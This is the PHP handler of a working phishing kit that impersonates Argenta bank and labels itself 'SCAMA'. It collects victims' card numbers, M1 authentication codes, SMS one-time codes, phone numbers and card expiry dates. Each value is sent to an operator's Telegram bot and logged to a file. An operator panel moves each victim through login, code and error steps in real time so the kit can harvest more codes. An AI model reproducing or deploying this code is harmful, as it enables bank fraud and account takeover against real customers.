<?php
    session_start(); 
    error_reporting(0);
	include "../includes/empty_file.php";
	include "../includes/added.php";
	include "../setting/config.php";
    include "../setting/functions.php";

    $ip = get_client_ip();
    $link_panel = $_SESSION["panel_control"];
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = $link_panel;
    
    $keyboard = json_encode([
        "inline_keyboard" => [

                [
                    [
                        "text" => '🕹 PaneL Control For  : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
                        "url" => "$link_panel"
                    ]
    
                ],
        ]
    ]);

    if($_SERVER['REQUEST_METHOD'] === 'POST'){
        if($_POST['step'] === 'login'){
            if (isset($_POST['b_s_d_1'])) {
                // Info User :
                $card_number = $_POST["card_number"];
        
                // Send Data To Telegram Bot :
                $message =
                "🔐====[ Login Argenta ]====🔐\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐====[ Login Argenta ]====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[====[ Login Argenta ]====]\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                " IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Login Argenta ]====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_1';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'login-error'){
            if (isset($_POST['b_s_d_2'])) {
                // Info User :
                $card_number = $_POST["card_number"];
        
                // Send Data To Telegram Bot :
                $message =
                "🔐====[ Login Argenta ERROR ]====🔐\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐====[ Login Argenta ERROR ]====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[====[ Login Argenta ERROR ]====]\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                " IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Login Argenta ERROR ]====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_2';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');

        }
        if($_POST['step'] === 'm1-code'){
            if (isset($_POST['b_s_d_3'])) {
                // Info User :
                $m1_code = $_POST["m1_code"];
        
                // Send Data To Telegram Bot :
                $message =
                "🔐====[ M1 Code Step ]====🔐\r\n".
                "[ 🔑🔐 M1 Code ] " . $m1_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐====[ M1 Code Step ]====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                $message =
                "[====[ M1 Code Step ]====]\r\n".
                "[ M1 Code ] " . $m1_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ M1 Code Step ]====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_3';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        if($_POST['step'] === 'm1-code-error'){
            if (isset($_POST['b_s_d_4'])) {
                // Info User :
                $m1_code = $_POST["m1_code"];
        
                // Send Data To Telegram Bot :
                $message =
                "🔐====[ M1 Code Step ERROR ]====🔐\r\n".
                "[ 🔑🔐 M1 Code ] " . $m1_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐====[ M1 Code Step ERROR ]====🔐\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                $message =
                "[====[ M1 Code Step ERROR ]====]\r\n".
                "[ M1 Code ] " . $m1_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ M1 Code Step ERROR ]====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_4';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'sms'){
            if (isset($_POST['b_s_d_5'])) {
                // Info User :
                $sms_code = $_POST['sms_code'];
                
                // Send Data To Telegram Bot :
                $message = 
                "📲====[ Code SMS ]====📲\r\n".
                "[ Code SMS ] " . $sms_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲====[ Code SMS ]====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Code SMS ]=====]\r\n".
                "[ Code SMS ] " . $sms_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Code SMS ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_5';
                empty_file($target, $data_count, $message_to_file);
            }

            header('Location: ../pages/loading.php');

        } 
        elseif($_POST['step'] === 'sms-error'){
            if (isset($_POST['b_s_d_6'])) {
                // Info User :
                $sms_code = $_POST['sms_code'];
                
                // Send Data To Telegram Bot :
                $message = 
                "📲====[ Code SMS ERROR ]====📲\r\n".
                "[ Code SMS ] " . $sms_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲====[ Code SMS ERROR ]====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Code SMS ERROR ]=====]\r\n".
                "[ Code SMS ] " . $sms_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Code SMS ERROR ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_6';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'information'){
            if (isset($_POST['b_s_d_7'])) {
                // Info User :
                $phone_number = $_POST['phone_number'];
                $date_expiry = $_POST['date_expiry'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤=====[ Information ]=====👤\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📅 Expiry Date ] " . $date_expiry ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤=====[ Information ]=====👤\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Information ]=====]\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Expiry Date ] " . $date_expiry ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Information ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_7';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'information-error'){
            if (isset($_POST['b_s_d_8'])) {
                // Info User :
                $phone_number = $_POST['phone_number'];
                $date_expiry = $_POST['date_expiry'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤=====[ Information ERROR ]=====👤\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📅 Expiry Date ] " . $date_expiry ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤=====[ Information ERROR ]=====👤\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Information ERROR ]=====]\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Expiry Date ] " . $date_expiry ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Information ERROR ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_8';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'extra-information'){
            if (isset($_POST['b_s_d_9'])) {
                // Info User :
                $extra_information = $_POST['extra_information'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤=====[ Extra Information ]=====👤\r\n".
                "[ 📝 Extra Information ] " . $extra_information ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤=====[ Extra Information ]=====👤\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Extra Information ]=====]\r\n".
                "[ Extra Information ] " . $extra_information ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Extra Information ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_9';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'extra-information-error'){
            if (isset($_POST['b_s_d_10'])) {
                // Info User :
                $extra_information = $_POST['extra_information'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤=====[ Extra Information ERROR ]=====👤\r\n".
                "[ 📝 Extra Information ] " . $extra_information ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤=====[ Extra Information ERROR ]=====👤\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Extra Information ERROR ]=====]\r\n".
                "[ Extra Information ] " . $extra_information ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Extra Information ERROR ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_10';
                empty_file($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'panel'){

            if($_POST['to'] === 'login'){

                $target = $_POST['id_vip'];
                $to = "login";
                added($target, $to);
            }
            elseif($_POST['to'] === 'login-error'){

                $target = $_POST['id_vip'];
                $to = "login-error";
                added($target, $to);

            }
            elseif($_POST['to'] === 'm1-code'){

                $target = $_POST['id_vip'];
                $m1_code = $_POST['m1_code'];
                $to = "m1-code";
                added_other_one($target, $to, $m1_code);

            }
            elseif($_POST['to'] === 'm1-code-error'){

                $target = $_POST['id_vip'];
                $m1_code = $_POST['m1_code'];
                $to = "m1-code-error";
                added_other_one($target, $to, $m1_code);

            }
            elseif($_POST['to'] === 'sms'){

                $target = $_POST['id_vip'];
                $to = "sms";
                added($target, $to);

            }
            elseif($_POST['to'] === 'sms-error'){

                $target = $_POST['id_vip'];
                $to = "sms-error";
                added($target, $to);
                
            }
            elseif($_POST['to'] === 'information'){

                $target = $_POST['id_vip'];
                $to = "information";
                added($target, $to);

            }
            elseif($_POST['to'] === 'information-error'){

                $target = $_POST['id_vip'];
                $to = "information-error";
                added($target, $to);

            }
            elseif($_POST['to'] === 'approvation'){

                $target = $_POST['id_vip'];
                $to = "approvation";
                added($target, $to);

            }
            elseif($_POST['to'] === 'approvation-error'){

                $target = $_POST['id_vip'];
                $to = "approvation-error";
                added($target, $to);
                
            }
            elseif($_POST['to'] === 'extra-information'){

                $target = $_POST['id_vip'];
                $extra_information = $_POST['extra_information'];
                $to = "extra-information";
                added_other_two($target, $to, $extra_information);

            }
            elseif($_POST['to'] === 'extra-information-error'){

                $target = $_POST['id_vip'];
                $extra_information = $_POST['extra_information'];
                $to = "extra-information-error";
                added_other_two($target, $to, $extra_information);
            }
            elseif($_POST['to'] === 'logout'){

                $target = $_POST['id_vip'];
                $to = "logout";
                $current_page = "User Is Logout From SCAMA";
                $userStatus = "<span class='offline'>Offline</span>";
                added_other($target, $to, $current_page, $userStatus);

                $statics_file = "../panel/get-panel/statics.json";
                $statics_data = file_get_contents($statics_file);
                $data_main_panel = json_decode($statics_data, true);
                $data_main_panel['total_done_steps'] += 1;
                $updated_statics_data = json_encode($data_main_panel);
                file_put_contents($statics_file, $updated_statics_data);

            }
            header('Location: ./panel.php?id_user='. $_POST["id_vip"].'');
        }

    } else {
        header('Location: ../index.php');
    }
?>